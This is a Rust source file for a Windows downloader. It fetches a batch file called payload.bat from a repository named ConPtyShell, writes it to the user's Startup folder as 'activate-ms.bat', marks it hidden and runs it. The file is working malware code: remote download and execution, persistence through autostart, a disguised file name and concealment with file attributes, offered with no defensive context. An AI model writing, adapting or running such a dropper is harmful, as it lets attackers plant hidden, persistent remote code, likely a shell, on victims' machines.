mod error;
mod http_client;

// Standard libraries
use std::ffi::OsStr;
use std::io::Write;
use std::os::windows::ffi::OsStrExt;
use std::path::PathBuf;
use std::str::FromStr;
use std::{fs::File, process::Command};

// 3rd party crates
use anyhow::Result;
use chrono::Local;
use directories::BaseDirs;
use error::Error;
use http::{HeaderMap, Method};
use http_client::{download_file, HttpRequest};
use log::LevelFilter;
use url::Url;
use winapi::um::fileapi::{GetFileAttributesW, SetFileAttributesW};
use winapi::um::winnt::FILE_ATTRIBUTE_HIDDEN;

fn init_logger(level: &str) {
    let mut log_builder = env_logger::Builder::new();
    log_builder.format(|buf, record| {
        let mut module = "";
        if let Some(path) = record.module_path() {
            if let Some(split) = path.split("::").last() {
                module = split;
            }
        }

        writeln!(
            buf,
            "{}[{}]:{}: {}",
            Local::now().format("[%d-%m-%Y %H:%M:%S]"),
            record.level(),
            module,
            record.args()
        )
    });

    log_builder.filter_level(LevelFilter::from_str(level).unwrap_or(LevelFilter::Info));
    if let Err(e) = log_builder.try_init() {
        log::error!("{:?}", e);
    }
}

fn save_to_file(buf: &[u8]) -> Result<PathBuf> {
    // Get the path to the 'shell:startup' folder
    let dirs = BaseDirs::new().ok_or(Error::IO("Directory not found".to_string()))?;
    let startup_path = dirs
        .config_dir()
        .join("Microsoft\\Windows\\Start Menu\\Programs\\Startup");

    // Create the file in the 'shell:startup' folder
    let file_path = startup_path.join("activate-ms.bat");
    let mut file = File::create(file_path.as_path())?;

    // Write the string content to the file
    file.write_all(buf)?;
    file.flush()?;

    // Convert the file path to wide characters (UTF-16)
    let wide_path: Vec<u16> = OsStr::new(&file_path)
        .encode_wide()
        .chain(std::iter::once(0))
        .collect();

    // Get the current file attributes
    let attributes = unsafe { GetFileAttributesW(wide_path.as_ptr()) };
    if attributes == 0xFFFFFFFF {
        return Err(Error::Other("GetFileAttributesW failed".to_string()).into());
    }

    // Set the "hidden" attribute
    let new_attributes = attributes | FILE_ATTRIBUTE_HIDDEN;

    // Update the file attributes
    let result = unsafe { SetFileAttributesW(wide_path.as_ptr(), new_attributes) };
    if result == 0 {
        return Err(Error::Other("SetFileAttributesW failed".to_string()).into());
    }
    Ok(file_path)
}

fn create_request() -> Result<HttpRequest> {
    let request = HttpRequest {
        url: Url::parse(
            "https://raw.githubusercontent.com/LorenzoLeonardo/ConPtyShell/master/payload.bat",
        )?,
        method: Method::GET,
        headers: HeaderMap::new(),
        body: Vec::new(),
    };
    Ok(request)
}

#[tokio::main(flavor = "current_thread")]
async fn main() -> Result<()> {
    init_logger("Debug");

    let request = create_request()?;
    let response = download_file(request).await?;
    let file_path = save_to_file(&response.body.as_slice())?;
    let _ = Command::new(file_path.as_os_str()).spawn()?;

    Ok(())
}
